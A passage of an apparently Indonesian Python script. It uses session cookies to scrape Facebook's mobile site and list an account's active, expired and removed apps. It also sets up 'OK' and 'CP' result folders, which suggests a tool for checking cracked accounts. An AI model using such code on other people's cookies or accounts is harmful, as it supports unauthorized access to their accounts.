		print('\r'+akun)
	apk1.clear()
	apk2.clear()
	apk3.clear()
	print("\r                                             ")
			
			
#--[ cek apk aktif ]--#
def get_active(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Ditambahkan' in apk.text:					
				apk1.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_active(next,cookie)
	except:pass

#--[ cek apk kadaluarsa ]--#
def get_inactive(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Kedaluwarsa' in apk.text:
				apk2.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_inactive(next,cookie)
	except:pass

#--[ cek apk dihapus ]--#		
def get_remove(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Dihapus' in apk.text:
				apk3.append(f"{str(apk.text).replace('Dihapus',' Dihapus')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_remove(next,cookie)
	except:pass
	
def make():
	try:os.system('pkg install mpv && pkg install play-audio')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('git pull')
	except:pass   
	clear_layar()
	back()
	
	
if __name__=='__main__':
	make()	
